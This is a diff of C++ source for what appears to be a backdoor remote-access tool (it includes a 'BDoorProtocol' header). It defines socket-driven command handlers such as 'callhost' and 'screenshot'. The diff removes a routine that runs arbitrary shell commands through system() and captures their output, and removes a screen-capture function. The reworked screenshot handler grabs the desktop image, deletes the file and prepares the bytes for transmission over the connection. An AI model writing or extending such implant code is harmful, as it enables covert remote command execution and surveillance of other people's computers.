@@ -1,11 +1,7 @@
 #pragma once
 #include <protocol/BDoorProtocol.h>
-#include <fstream>
 #include<vector>
-#include <fstream>
 #include <other\tools.h>
-#define CMD_RETURN_TXT_NAME "cmd_return.txt"
-#define CMDERROR "cmd命令执行失败"
 class Command {
 private:
 	const string name = "command";
@@ -20,35 +16,6 @@ public:
 	virtual int Func(string command) = 0;
 	virtual string GetName() = 0;
 };
-int run_cmd_with_txt(string cmd_command, string& mess) {
-	fstream fst;
-	fst.open(CMD_RETURN_TXT_NAME, ios::trunc | ios::out);
-	if (!fst.is_open()) {
-		DebugLog("文件打开失败");
-		return -1;
-	}
-	else { DebugLog("文件打开成功"); }
-	fst.close();
-	cmd_command += string(" >> ") + CMD_RETURN_TXT_NAME;
-	if (system(cmd_command.data()) == -1) {
-		mess = CMDERROR;
-		DebugLog("cmd命令执行失败");
-		return -1;
-	}
-	ifstream ifs;
-	ifs.open(CMD_RETURN_TXT_NAME, ios::in);
-	string remess = "\n";
-	string buf;
-	while (getline(ifs, buf)) { remess += buf + string("\n"); }
-	mess = remess;
-	ifs.close();
-	if (remove(string(CMD_RETURN_TXT_NAME).data()) == 0) { DebugLog("成功删除文件"); }
-	else {
-		DebugLog("无法删除文件");
-		return -1;
-	}
-	return 1;
-}
 class CallHost : public Command{
 private:
 	const string name = "callhost";
@@ -173,38 +140,19 @@ private:
 		const string name = "screenshot";
 		const string imagep = "image.";
 		SOCKET &connect_socket;
-		bool GetScreenShot(string format) {
-			HDC hdcSrc = GetDC(NULL);
-			int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);
-			int nWidth = GetDeviceCaps(hdcSrc, HORZRES);
-			int nHeight = GetDeviceCaps(hdcSrc, VERTRES);
-			CImage image;
-			image.Create(nWidth, nHeight, nBitPerPixel);
-			BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);
-			ReleaseDC(NULL, hdcSrc);
-			image.ReleaseDC();
-			CString filepath(string(imagep + format).c_str());
-			int format_pos = VectorFind(image_format, format);
-			image.Save((LPCTSTR)filepath, GUID_vec[format_pos]);
-			return true;
-		}
 	public:
 		ScreenShot(SOCKET &connect_socket_a):connect_socket(connect_socket_a){}
 		int Func(string command)override {
 			json com_json = json::parse(command);
 			if (com_json[COMMANDNAME] == name) {
-				GetScreenShot(com_json[CONTENT][IMAGEFORMAT]);
-				string file_name = imagep + string(com_json[CONTENT][IMAGEFORMAT]);
+				string filename = imagep + string(com_json[CONTENT][IMAGEFORMAT]);
+				GetScreenShot(filename);
 				ifstream ifs;
-				ifs.open(file_name, ios::in|ios::binary);
+				ifs.open(filename, ios::in|ios::binary);
 				vector<char> data(istreambuf_iterator<char>(ifs), {});
 				ifs.close();
-				if (remove(file_name.data()) == 0) {
-					DebugLog("成功删除图片");
-				}
-				else {
-					DebugLog("无法删除图片");
-				}
+				if (remove(filename.c_str()) == 0) {DebugLog("成功删除图片");}
+				else {DebugLog("无法删除图片");}
 				string img_data;
 				for (int i = 0; i < data.size(); i++) { img_data += data[i]; }
 				DebugLog("img_data size："+ to_string(img_data.size()));
